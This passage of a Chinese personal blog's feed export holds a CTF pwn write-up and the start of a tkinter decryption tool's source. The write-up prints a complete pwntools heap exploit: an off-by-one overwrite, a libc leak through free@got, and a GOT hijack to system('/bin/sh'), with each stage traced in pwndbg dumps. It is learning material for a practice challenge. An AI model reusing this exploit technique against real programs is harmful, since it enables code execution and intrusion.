class="number">0x18</span>, <span class="string">b&quot;a&quot;</span>*<span class="number">4</span>)              <span class="comment"># 创建第一个 chunk (index 0)</span></span><br><span class="line">creat(<span class="number">0x10</span>, <span class="string">b&quot;b&quot;</span>*<span class="number">4</span>)              <span class="comment"># 创建第二个 chunk (index 1)</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&quot;/bin/sh\x00&quot;</span> + <span class="string">b&quot;a&quot;</span>*<span class="number">0x10</span> + <span class="string">b&#x27;\x41&#x27;</span>)  <span class="comment"># 修改 chunk 0，伪造 size 字段为 0x41</span></span><br><span class="line">delete(<span class="number">1</span>)                        <span class="comment"># 释放 chunk 1，进入 fastbin</span></span><br><span class="line">creat(<span class="number">0x30</span>, p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0x10</span>) + p64(free_got))  <span class="comment"># 分配大块覆盖 chunk 1，并在其中写入 free@got 地址</span></span><br><span class="line">show(<span class="number">1</span>)                          <span class="comment"># 泄露 free 地址</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Content : &quot;</span>)</span><br><span class="line">free_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))  <span class="comment"># 读取泄露的 free 地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Free address: <span class="subst">&#123;<span class="built_in">hex</span>(free_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 LibcSearcher 确定 libc 版本和基地址</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;free&quot;</span>, free_addr)</span><br><span class="line">libc_base = free_addr - libc.dump(<span class="string">&quot;free&quot;</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将 free@got 指向 system</span></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发 free(0)，即调用 system(&quot;/bin/sh&quot;)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入交互模式</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">No matched libc, please add more libc or try others</span><br><span class="line">去网上找一下</span><br><span class="line">发现是libc6_2.27-3ubuntu1.6_amd64。换上去就行了</span><br></pre></td></tr></table></figure>

<p>这样这题基本解决了，进行动态调试详细了解一下。</p>
<p>第一个次create</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6032b0</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6032d0</span><br><span class="line">Size: 0x20d30 (with flag bits: 0x20d31)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/30gx  0x603290</span><br><span class="line">0x603290:	0x0000000000000000	0x0000000000000021  //堆块大小0x21</span><br><span class="line">0x6032a0:	0x0000000000000018	0x00000000006032c0  //0x00000000006032c0 ---&gt;0x0000000a61616161</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">0x6032b0:	0x0000000000000000	0x0000000000000021  //堆块大小0x21</span><br><span class="line">0x6032c0:	0x0000000a61616161	0x0000000000000000  //aaaa</span><br></pre></td></tr></table></figure>

<p>第二个次create</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6032b0</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6032d0</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x6032f0</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x603310</span><br><span class="line">Size: 0x20cf0 (with flag bits: 0x20cf1)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/50gx  0x603290</span><br><span class="line">0x603290:	0x0000000000000000	0x0000000000000021   //堆块大小0x21</span><br><span class="line">0x6032a0:	0x0000000000000018	0x00000000006032c0   //0x00000000006032c0 ---&gt;0x0000000a61616161</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">0x6032b0:	0x0000000000000000	0x0000000000000021  //堆块大小0x21</span><br><span class="line">0x6032c0:	0x0000000a61616161	0x0000000000000000  //aaaa</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">0x6032d0:	0x0000000000000000	0x0000000000000021 //堆块大小0x21</span><br><span class="line">0x6032e0:	0x0000000000000010	0x0000000000603300 //0x0000000000603300 ---&gt;0x0000000a62626262</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">0x6032f0:	0x0000000000000000	0x0000000000000021 //堆块大小0x21</span><br><span class="line">0x603300:	0x0000000a62626262	0x0000000000000000 //bbbb</span><br></pre></td></tr></table></figure>

<p>执行第一个edit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x35324000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x35324290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x353242b0</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x353242d0</span><br><span class="line">Size: 0x40 (with flag bits: 0x41)  //第二个堆块大小已经被改成0x40了,这也是为什么是0x30的原因之一。</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x35324310</span><br><span class="line">Size: 0x20cf0 (with flag bits: 0x20cf1)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x35324290</span><br><span class="line">0x35324290:	0x0000000000000000	0x0000000000000021 //堆块大小0x21</span><br><span class="line">0x353242a0:	0x0000000000000018	0x00000000353242c0 //0x00000000353242c0 ---&gt;0x0068732f6e69622f(/bin/sh)</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">0x353242b0:	0x0000000000000000	0x0000000000000021 //堆块大小0x21</span><br><span class="line">0x353242c0:	0x0068732f6e69622f	0x6161616161616161 //b&#x27;/bin/sh\x00&#x27; + b&#x27;a&#x27;*0x10</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">0x353242d0:	0x6161616161616161	0x0000000000000041 //0x21被覆盖为0x41</span><br><span class="line">0x353242e0:	0x0000000000000010	0x0000000035324300 //0x0000000035324300 ---&gt;0x0000000a62626262</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">0x353242f0:	0x0000000000000000	0x0000000000000021 //堆块大小0x21</span><br><span class="line">0x35324300:	0x0000000a62626262	0x0000000000000000 //bbbb</span><br></pre></td></tr></table></figure>

<p>第一次delete</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x35324000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x35324290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x353242b0</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x353242d0</span><br><span class="line">Size: 0x40 (with flag bits: 0x41)</span><br><span class="line">fd: 0x35324   //被释放了</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x35324310</span><br><span class="line">Size: 0x20cf0 (with flag bits: 0x20cf1)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x35324290</span><br><span class="line">0x35324290:	0x0000000000000000	0x0000000000000021 //堆块大小0x21</span><br><span class="line">0x353242a0:	0x0000000000000018	0x00000000353242c0 //0x00000000353242c0 ---&gt;0x0068732f6e69622f(/bin/sh)</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">0x353242b0:	0x0000000000000000	0x0000000000000021 //堆块大小0x21</span><br><span class="line">0x353242c0:	0x0068732f6e69622f	0x6161616161616161 //b&#x27;/bin/sh\x00&#x27; + b&#x27;a&#x27;*0x10</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">0x353242d0:	0x6161616161616161	0x0000000000000041 </span><br><span class="line">0x353242e0:	0x0000000000035324	0xa752a1d4c2f9e9c9//已被free</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">0x353242f0:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x35324300:	0x0000000000035324	0xa752a1d4c2f9e9c9//已被free</span><br></pre></td></tr></table></figure>

<p>第三次create</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x35324000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x35324290</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x353242b0</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x353242d0</span><br><span class="line">Size: 0x40 (with flag bits: 0x41)  //第三块正好是被释放第一块所在的地方</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x35324310</span><br><span class="line">Size: 0x20cf0 (with flag bits: 0x20cf1)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/30gx 0x35324290</span><br><span class="line">0x35324290:	0x0000000000000000	0x0000000000000021 //堆块大小0x21</span><br><span class="line">0x353242a0:	0x0000000000000018	0x00000000353242c0 //0x00000000353242c0 ---&gt;0x0068732f6e69622f(/bin/sh)</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">0x353242b0:	0x0000000000000000	0x0000000000000021 //堆块大小0x21</span><br><span class="line">0x353242c0:	0x0068732f6e69622f	0x6161616161616161 //b&#x27;/bin/sh\x00&#x27; + b&#x27;a&#x27;*0x10</span><br><span class="line">-------------------------------------------------------------------------------------------------------------------</span><br><span class="line">0x353242d0:	0x6161616161616161	0x0000000000000041 //堆块大小0x41</span><br><span class="line">0x353242e0:	0x0000000000000000	0x0000000000000000 //p64(0) * 4</span><br><span class="line">0x353242f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x35324300:	0x0000000000000010	0x0000000000602018 //p64(0x10) + free的got地址</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">注释：为什么打印出来的是free()的真实地址，而不是free_got的地址？</span><br><span class="line">你看到的是 free 的真实地址，而不是 GOT 地址，因为你从 GOT 条目中读出了它的内容（也就是解引用了一次），而 GOT 条目里存的就是 free() 的真实地址。</span><br></pre></td></tr></table></figure>

<p>把free_got的地址覆盖成system的地址，最后delete(0):</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x0000000000602018</span><br><span class="line">00:0000│  0x602018 (free@got[plt]) —▸ 0x729199e58750 (system) ◂— endbr64 //free_got --&gt;system</span><br><span class="line">01:0008│  0x602020 (_exit@got.plt) —▸ 0x400696 (_exit@plt+6) ◂— push 1</span><br><span class="line">02:0010│  0x602028 (puts@got[plt]) —▸ 0x729199e87be0 (puts) ◂— endbr64 </span><br><span class="line">03:0018│  0x602030 (__stack_chk_fail@got.plt) —▸ 0x4006b6 (__stack_chk_fail@plt+6) ◂— push 3</span><br><span class="line">04:0020│  0x602038 (printf@got[plt]) —▸ 0x729199e60100 (printf) ◂— endbr64 </span><br><span class="line">05:0028│  0x602040 (read@got[plt]) —▸ 0x729199f1ba50 (read) ◂— endbr64 </span><br><span class="line">06:0030│  0x602048 (malloc@got[plt]) —▸ 0x729199ead650 (malloc) ◂— endbr64 </span><br><span class="line">07:0038│  0x602050 (setvbuf@got[plt]) —▸ 0x729199e88550 (setvbuf) ◂— endbr64</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; find 0x729199e58750, +0x200000, &quot;/bin/sh&quot;</span><br><span class="line">0x729199fcb42f</span><br><span class="line">warning: Unable to access 16000 bytes of target memory at 0x72919a011937, halting search.</span><br><span class="line">1 pattern found.</span><br><span class="line">pwndbg&gt; x/s 0x729199fcb42f</span><br><span class="line">0x729199fcb42f:	&quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure>

<p>动调也完成了，这题到这里就完工了。</p>
<p>OK到这里，off_by_one也学了💻📚，pwn143是堆溢出💾🧨，下午先学学别的知识🧠📖，晚上继续写pwn🌙⌨️，fighting💪🔥</p>
<h4 id="堆溢出-1"><a href="#堆溢出-1" class="headerlink" title="堆溢出"></a>堆溢出</h4><p>这里堆溢出的知识点是House of Force。从另一篇文章开始写全部，放在堆的学习分类里面。</p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>heap</category>
      </categories>
  </entry>
  <entry>
    <title>linkpwn的小金库</title>
    <url>/2025/06/18/linkpwn%E7%9A%84%E5%B0%8F%E9%87%91%E5%BA%93/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="秘钥是他的真名小写英文和beautiful girl的真名小写英文" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="a7d079c5942e4de0d65f069ff4ce8bc7ec08944d476986ec0d0e81bdb4f3fa7e">51c423386861ead07fe94d315d362dc1ad7db5de1f62076124c672554ba09b458b8a1025ec34c68e5852553eb16b4ca5dfb35bca2f83c4f16fc811dc25cccfcd654b8619bb00f23783217b420ea0c0ff9ebc81cee82ea65dfdc542c59d1ab2ad0adb807e8150f935974addf1595f67cd552696a88866bf960bd9915cacc95abe03a0162907a14fef3bc0d0dfd5107cdf57466dc25b26f4b6be66f35ec4276b5a7ee154a99cf18a6ac6c38393be902d950e47125a6dbb94e4202945c7643e578f338cc3a75d1bf330ccf350f90e57e045bf52e9304335ccc37ef3bda2d904702ceedbe5bb9433474e33225a74e673e610714d5d07d5931888da170d9b61c0da887f3053ae1f79353be642808d324843e3481d3fe6e8c3c15e1124384f7ace2ab4bccca309e44d4a74a1481711fb5e46995b28d7973a632b96a6966947022394a599381275ecaaa864d5cd3128fa7ba5a09b2561b7521b747930e15983c53b72b897f57260391bf88ca03e0ac31e4a64f876169bed879050d5b554d4585b1abc55cb02bdec4be1af196b447b71154aeb9af15544fb161e8fe881c7ca87e1adbb40b0bddd6930d0906577b0cbab5a6fbd97a8f489c81838c999e65d55d77a765b19f1a6add30a798336cf9f13da336a7e16f630568c056de975ed2b75fcc90fecb2cc489544cd9b289ea2a56afbcde6f5115027fc15b49aa23abe9b3567f7349d1f043ff1f794c22d7ef19518e6c6e2cbc6c8c0afb949c57130071e4278b705bcb8308e7063ef2acd6e60f1bf7154528901e35ea3eb1927e10a93ca38faf13faa4bf56c637bc06374ff0efea7fbe8be76d24df8ec035ec0fe63d705fd40fc3441645d4165430995adb9cc4c2e4ec60674e44a81ec199954a8b2d77a6c48ec51cc80cf8df33031835eb5b543a095f6389cb42815d9aec6e55d28ec018a7b5eac8ddf1da6a6c7f7614ecd96d56e4d2f81c8b81749529b24fac37c4656776add90ef1eab24079da125699bc82d4d9b5c1bae30b29cbd7506146a29d4e5695acd721a09ff9b7c61f5e61369a0d33eca06988284aa139410d1f144e9aa35f85ccfa4a6846e09a977c2017b8b312d21b64dfa930668972aa223daa9de4c83beb854bc47420756632286274ab07768d5b06ebf65c9f7d02e26f23d2609006c09fa0dbb5cb8d0ea1aa01da61d379030ca9cd20bcd75a01da0de73635817dc35b2d9faf8fc705698d7ec1f02d11a33774b7dca168752656d40eea0eee9ba9f6712c8d8ae9332ec21fd13cce5608837e98b307d9b46067ae806617af98261a6272ee030ac93b599b62aac489bc6aadf5dc1f6299329b0ee47686d1f7967f051a38f5ad18925eb7d340c6769484b2cad1b44bb9671c6afbd0e76d328931cd956f3cd0784c4f5b1ae5f3a7347858ea4f360f922fb260b2e0979278d811430033a74571cd0a0fa1d4f6c430de197f32eb78e2f03c2b965410c07f608a0a4ae17859501183efb84d28220be080f73c5701deb1f779ef76d94e1e4f338a65987c4a9981d25f067d42e14b332b66fd0cfc894f7e585090dc1c3b11fbd66959f9206becf0feffb9df5fd185f389a6349a20ed4033b3d65925f028f4e5cbc49bfeddd799eea2507211b89014fe740d0a5661bc2c583af6fd9351e8b91c8d0c078cffe9555d1552a2f902558c0b26b97dbe4930c959349845d4602036bca4cfe871870d721adc97a2b1555</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">也许这个金钥和他暗恋的女孩子有关哦[旺柴][旺柴][旺柴]</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>linkpwn的私人空间</category>
      </categories>
  </entry>
  <entry>
    <title>linkpwn的解密工具</title>
    <url>/2025/06/18/linkpwn%E7%9A%84%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7/</url>
    <content><![CDATA[<p>main.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> messagebox, ttk</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageTk</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入外部解密模块</span></span><br><span class="line"><span class="keyword">from</span> xor1 <span class="keyword">import</span> decrypt <span class="keyword">as</span> xor_decrypt</span><br><span class="line"><span class="keyword">from</span> rc4 <span class="keyword">import</span> decrypt <span class="keyword">as</span> rc4_decrypt</span><br><span class="line"><span class="keyword">from</span> tea <span class="keyword">import</span> decrypt1 <span class="keyword">as</span> tea_decrypt</span><br><span class="line"><span class="keyword">from</span> xtea <span class="keyword">import</span> decrypt1 <span class="keyword">as</span> xtea_decrypt</span><br><span class="line"><span class="keyword">from</span> xxtea <span class="keyword">import</span> decrypt <span class="keyword">as</span> xxtea_decrypt</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UIBuilder</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;UI组件构建工具类，用于创建统一风格的UI元素&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_title</span>(<span class="params">parent, text, font_size=<span class="number">24</span>, emoji=<span class="string">&quot;&quot;</span>, bg=<span class="string">&quot;#1a1a2e&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建带表情符号的标题标签&quot;&quot;&quot;</span></span><br><span class="line">        title = tk.Label(</span><br><span class="line">            parent,</span><br><span class="line">            text=<span class="string">f&quot;<span class="subst">&#123;emoji&#125;</span> <span class="subst">&#123;text&#125;</span> <span class="subst">&#123;emoji&#125;</span>&quot;</span>,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, font_size, <span class="string">&quot;bold&quot;</span>),</span><br><span class="line">            bg=bg,</span><br><span class="line">            fg=<span class="string">&quot;white&quot;</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> title</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_button</span>(<span class="params">parent, text, command, bg=<span class="string">&quot;#4ECDC4&quot;</span>, font_size=<span class="number">12</span>, emoji=<span class="string">&quot;&quot;</span>, bg_hover=<span class="string">&quot;#3A9DA2&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建带悬停效果的按钮&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">on_enter</span>(<span class="params">e</span>):</span><br><span class="line">            btn.config(bg=bg_hover)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">on_leave</span>(<span class="params">e</span>):</span><br><span class="line">            btn.config(bg=bg)</span><br><span class="line"></span><br><span class="line">        btn = tk.Button(</span><br><span class="line">            parent,</span><br><span class="line">            text=<span class="string">f&quot;<span class="subst">&#123;emoji&#125;</span> <span class="subst">&#123;text&#125;</span> <span class="subst">&#123;emoji&#125;</span>&quot;</span> <span class="keyword">if</span> emoji <span class="keyword">else</span> text,</span><br><span class="line">            command=command,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, font_size, <span class="string">&quot;bold&quot;</span>),</span><br><span class="line">            bg=bg,</span><br><span class="line">            fg=<span class="string">&quot;white&quot;</span>,</span><br><span class="line">            relief=<span class="string">&quot;flat&quot;</span>,</span><br><span class="line">            bd=<span class="number">0</span></span><br><span class="line">        )</span><br><span class="line">        btn.bind(<span class="string">&quot;&lt;Enter&gt;&quot;</span>, on_enter)</span><br><span class="line">        btn.bind(<span class="string">&quot;&lt;Leave&gt;&quot;</span>, on_leave)</span><br><span class="line">        <span class="keyword">return</span> btn</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_label</span>(<span class="params">parent, text, font_size=<span class="number">12</span>, fg=<span class="string">&quot;white&quot;</span>, bg=<span class="string">&quot;#1a1a2e&quot;</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;创建统一风格的标签&quot;&quot;&quot;</span></span><br><span class="line">        label = tk.Label(</span><br><span class="line">            parent,</span><br><span class="line">            text=text,</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, font_size),</span><br><span class="line">            fg=fg,</span><br><span class="line">            bg=bg</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> label</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">create_algorithm_info</span>(<span class="params">parent, algorithm</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;生成算法说明文本&quot;&quot;&quot;</span></span><br><span class="line">        info_texts = &#123;</span><br><span class="line">            <span class="string">&quot;xor&quot;</span>: <span class="string">&quot; XOR通过将密文与密钥进行异或操作来还原明文。\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;特点：速度快，适用于简单加密场景，但安全性较低。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;rc4&quot;</span>: <span class="string">&quot;RC4是一种流加密算法，通过密钥生成伪随机字节流，与密文异或得到明文。\n&quot;</span></span><br><span class="line">                   <span class="string">&quot;    特点：效率高，常用于网络数据加密，但存在安全漏洞需注意。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;tea&quot;</span>: <span class="string">&quot;TEA是一种分组加密算法，使用64位分组和128位密钥。\n&quot;</span></span><br><span class="line">                   <span class="string">&quot; 特点：结构简单，安全性较高，适用于资源受限环境。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xtea&quot;</span>: <span class="string">&quot;XTEA是TEA的扩展版本，改进了加密函数和密钥调度算法。\n&quot;</span></span><br><span class="line">                    <span class="string">&quot;  特点：比TEA更抗密码分析，保持了算法简洁性。&quot;</span>,</span><br><span class="line">            <span class="string">&quot;xxtea&quot;</span>: <span class="string">&quot;XXTEA是另一种TEA扩展，进一步优化了加密强度和性能。\n&quot;</span></span><br><span class="line">                     <span class="string">&quot;    特点：安全性高，适用于需要可靠加密的场景。&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        info = tk.Label(</span><br><span class="line">            parent,</span><br><span class="line">            text=info_texts.get(algorithm, <span class="string">&quot;暂无算法说明&quot;</span>),</span><br><span class="line">            font=(<span class="string">&quot;微软雅黑&quot;</span>, <span class="number">10</span>),</span><br><span class="line">            fg=<span class="string">&quot;#CCCCCC&quot;</span>,</span><br><span class="line">            bg=<span class="string">&quot;#1a1a2e&quot;</span>,</span><br><span class="line">            justify=tk.LEFT,</span><br><span class="line">            wraplength=<span class="number">480</span></span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">VideoBackground</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;视频背景播放器（增强版，强制使用视频背景）&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, parent, video_path, width=<span class="number">800</span>, height=<span class="number">600</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.parent = parent</span><br><span class="line">        <span class="variable language_">self</span>.width = width</span><br><span class="line">        <span class="variable language_">self</span>.height = height</span><br><span class="line">        <span class="variable language_">self</span>.video_path = os.path.abspath(video_path)</span><br><span class="line">        <span class="variable language_">self</span>.cap = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.video_label = tk.Label(parent, bg=<span class="string">&quot;black&quot;</span>)</span><br><span class="line">        <span class="variable language_">self</span>.video_label.place(x=<span class="number">0</span>, y=<span class="number">0</span>, relwidth=<span class="number">1</span>, relheight=<span class="number">1</span>)</span><br><span class="line">        <span class="variable language_">self</span>.stop_flag = <span class="literal">False</span></span><br><span class="line">        <span class="variable language_">self</span>.thread = <span class="literal">None</span></span><br><span class="line">        <span class="variable language_">self</span>.running = <span class="literal">True</span></span><br><span class="line">        <span class="variable language_">self</span>.error_count = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 尝试多次加载视频，避免单次失败</span></span><br><span class="line">        <span class="variable language_">self</span>._init_video(force=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_init_video</span>(<span class="params">self, force=<span class="literal">False</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化视频，支持强制重试&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="variable language_">self</span>.video_path):</span><br><span class="line">            <span class="variable language_">self</span>._show_error(<span class="string">f&quot;⚠️ 视频文件不存在：<span class="subst">&#123;self.video_path&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>._create_error_overlay(<span class="string">&quot;视频文件缺失&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="variable language_">self</span>.cap = cv2.VideoCapture(<span class="variable language_">self</span>.video_path)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> <span class="variable language_">self</span>.cap.isOpened():</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">f&quot;无法打开视频文件：<span class="subst">&#123;self.video_path&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">self</span>.fps = <span class="variable 